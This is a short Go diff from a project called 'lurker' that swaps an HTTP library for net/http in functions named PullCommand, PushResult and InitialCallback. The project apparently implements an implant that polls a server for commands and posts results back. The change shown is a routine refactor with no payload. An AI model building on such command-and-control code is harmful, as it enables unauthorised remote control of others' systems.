@@ -9,13 +9,12 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"net/http"
 
 	"lurker/lurker/constants"
 	"lurker/lurker/cryptography"
 	"lurker/lurker/os"
 	"lurker/lurker/utilities"
-
-	"github.com/imroc/req"
 )
 
 var (
@@ -226,12 +225,12 @@ func InitialCallback() bool {
 	return true
 }
 
-func PullCommand() *req.Resp {
+func PullCommand() *http.Response {
 	resp := HttpGet(constants.GetUrl, encryptedMetaInfo)
 	return resp
 }
 
-func PushResult(b []byte) *req.Resp {
+func PushResult(b []byte) *http.Response {
 	url := constants.PostUrl
 	id := strconv.Itoa(clientID)
 	resp := HttpPost(url, id, b)
